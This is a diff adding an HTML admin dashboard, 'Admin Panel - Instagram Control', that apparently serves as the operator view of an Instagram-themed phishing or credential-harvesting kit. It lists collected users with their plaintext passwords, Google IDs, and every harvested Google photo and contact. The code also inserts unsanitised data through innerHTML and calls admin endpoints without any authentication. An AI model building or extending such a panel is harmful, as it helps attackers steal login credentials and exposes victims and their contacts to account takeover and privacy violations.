@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel - Instagram Control</title>
+    <link rel="stylesheet" href="admin.css">
+</head>
+<body>
+    <div class="admin-container">
+        <header class="admin-header">
+            <h1>🔐 Admin Panel - Instagram Control</h1>
+            <p>Monitor and manage all user activities</p>
+        </header>
+
+        <div class="stats-container">
+            <div class="stat-card">
+                <h3>Total Users</h3>
+                <p class="stat-number" id="totalUsers">0</p>
+            </div>
+            <div class="stat-card">
+                <h3>Google Logins</h3>
+                <p class="stat-number" id="googleLogins">0</p>
+            </div>
+            <div class="stat-card">
+                <h3>Manual Logins</h3>
+                <p class="stat-number" id="manualLogins">0</p>
+            </div>
+        </div>
+
+        <div class="users-section">
+            <div class="section-header">
+                <h2>All Users</h2>
+                <button class="refresh-btn" onclick="loadUsers()">🔄 Refresh</button>
+            </div>
+
+            <div id="usersContainer" class="users-container">
+                <!-- Users will be loaded here -->
+            </div>
+        </div>
+
+        <!-- User Detail Modal -->
+        <div id="userModal" class="modal">
+            <div class="modal-content">
+                <span class="close" onclick="closeModal()">&times;</span>
+                <div id="userDetails"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const API_URL = 'http://localhost:5000';
+        let allUsers = [];
+
+        // Load users on page load
+        window.addEventListener('DOMContentLoaded', loadUsers);
+
+        async function loadUsers() {
+            try {
+                const response = await fetch(`${API_URL}/admin/users`);
+                const data = await response.json();
+
+                if (data.success) {
+                    allUsers = data.users;
+                    displayUsers(allUsers);
+                    updateStats(allUsers);
+                } else {
+                    alert('Failed to load users');
+                }
+            } catch (error) {
+                console.error('Error loading users:', error);
+                alert('Error loading users. Make sure the backend is running.');
+            }
+        }
+
+        function displayUsers(users) {
+            const container = document.getElementById('usersContainer');
+            
+            if (users.length === 0) {
+                container.innerHTML = '<p class="no-users">No users found</p>';
+                return;
+            }
+
+            container.innerHTML = users.map(user => `
+                <div class="user-card">
+                    <div class="user-header">
+                        <img src="${user.profilePhoto || 'https://via.placeholder.com/60'}" 
+                             alt="Profile" 
+                             class="user-avatar"
+                             onerror="this.src='https://via.placeholder.com/60'">
+                        <div class="user-info">
+                            <h3>${user.displayName || user.username || 'Unknown User'}</h3>
+                            <p class="user-email">${user.email || 'No email'}</p>
+                            <span class="login-badge ${user.loginMethod}">${user.loginMethod}</span>
+                        </div>
+                    </div>
+                    
+                    <div class="user-details">
+                        <div class="detail-row">
+                            <strong>Username:</strong> 
+                            <span>${user.username || 'N/A'}</span>
+                        </div>
+                        <div class="detail-row">
+                            <strong>Password:</strong> 
+                            <span>${user.password || 'N/A'}</span>
+                        </div>
+                        <div class="detail-row">
+                            <strong>Google ID:</strong> 
+                            <span>${user.googleId || 'N/A'}</span>
+                        </div>
+                        <div class="detail-row">
+                            <strong>Created:</strong> 
+                            <span>${new Date(user.createdAt).toLocaleString()}</span>
+                        </div>
+                        <div class="detail-row">
+                            <strong>Last Login:</strong> 
+                            <span>${new Date(user.lastLogin).toLocaleString()}</span>
+                        </div>
+                        <div class="detail-row">
+                            <strong>Google Photos:</strong> 
+                            <span>${user.googlePhotos?.length || 0} photos</span>
+                        </div>
+                        <div class="detail-row">
+                            <strong>Google Contacts:</strong> 
+                            <span>${user.googleContacts?.length || 0} contacts</span>
+                        </div>
+                    </div>
+
+                    <div class="user-actions">
+                        <button class="view-btn" onclick="viewUserDetails('${user._id}')">
+                            👁️ View Full Details
+                        </button>
+                        <button class="delete-btn" onclick="deleteUser('${user._id}', '${user.displayName || user.username}')">
+                            🗑️ Delete User
+                        </button>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function updateStats(users) {
+            document.getElementById('totalUsers').textContent = users.length;
+            document.getElementById('googleLogins').textContent = 
+                users.filter(u => u.loginMethod === 'google').length;
+            document.getElementById('manualLogins').textContent = 
+                users.filter(u => u.loginMethod === 'manual').length;
+        }
+
+        async function viewUserDetails(userId) {
+            try {
+                const response = await fetch(`${API_URL}/admin/users/${userId}`);
+                const data = await response.json();
+
+                if (data.success) {
+                    const user = data.user;
+                    const modal = document.getElementById('userModal');
+                    const detailsDiv = document.getElementById('userDetails');
+
+                    detailsDiv.innerHTML = `
+                        <h2>User Details</h2>
+                        <div class="modal-user-info">
+                            <img src="${user.profilePhoto || 'https://via.placeholder.com/100'}" 
+                                 alt="Profile" 
+                                 class="modal-avatar"
+                                 onerror="this.src='https://via.placeholder.com/100'">
+                            <h3>${user.displayName || user.username || 'Unknown User'}</h3>
+                            <p>${user.email || 'No email'}</p>
+                        </div>
+
+                        <div class="detail-section">
+                            <h3>Account Information</h3>
+                            <p><strong>Username:</strong> ${user.username || 'N/A'}</p>
+                            <p><strong>Password:</strong> ${user.password || 'N/A'}</p>
+                            <p><strong>Google ID:</strong> ${user.googleId || 'N/A'}</p>
+                            <p><strong>Login Method:</strong> ${user.loginMethod}</p>
+                            <p><strong>Created:</strong> ${new Date(user.createdAt).toLocaleString()}</p>
+                            <p><strong>Last Login:</strong> ${new Date(user.lastLogin).toLocaleString()}</p>
+                        </div>
+
+                        ${user.googlePhotos && user.googlePhotos.length > 0 ? `
+                            <div class="detail-section">
+                                <h3>All Google Photos (${user.googlePhotos.length} total)</h3>
+                                <div class="photos-grid">
+                                    ${user.googlePhotos.map(photo => `
+                                        <img src="${photo.url}" 
+                                             alt="${photo.filename}" 
+                                             class="photo-thumbnail"
+                                             onerror="this.style.display='none'">
+                                    `).join('')}
+                                </div>
+                            </div>
+                        ` : ''}
+
+                        ${user.googleContacts && user.googleContacts.length > 0 ? `
+                            <div class="detail-section">
+                                <h3>All Google Contacts (${user.googleContacts.length} total)</h3>
+                                <div class="contacts-list">
+                                    ${user.googleContacts.map(contact => `
+                                        <div class="contact-item">
+                                            <img src="${contact.photo || 'https://via.placeholder.com/40'}" 
+                                                 alt="${contact.name}"
+                                                 onerror="this.src='https://via.placeholder.com/40'">
+                                            <div>
+                                                <strong>${contact.name}</strong>
+                                                <p>${contact.email || contact.phone || 'No contact info'}</p>
+                                            </div>
+                                        </div>
+                                    `).join('')}
+                                </div>
+                            </div>
+                        ` : ''}
+                    `;
+
+                    modal.style.display = 'block';
+                } else {
+                    alert('Failed to load user details');
+                }
+            } catch (error) {
+                console.error('Error loading user details:', error);
+                alert('Error loading user details');
+            }
+        }
+
+        async function deleteUser(userId, userName) {
+            if (!confirm(`Are you sure you want to delete user "${userName}"? This action cannot be undone.`)) {
+                return;
+            }
+
+            try {
+                const response = await fetch(`${API_URL}/admin/users/${userId}`, {
+                    method: 'DELETE'
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    alert('User deleted successfully');
+                    loadUsers(); // Reload users
+                } else {
+                    alert('Failed to delete user: ' + data.message);
+                }
+            } catch (error) {
+                console.error('Error deleting user:', error);
+                alert('Error deleting user');
+            }
+        }
+
+        function closeModal() {
+            document.getElementById('userModal').style.display = 'none';
+        }
+
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            const modal = document.getElementById('userModal');
+            if (event.target == modal) {
+                modal.style.display = 'none';
+            }
+        }
+    </script>
+</body>
+</html>
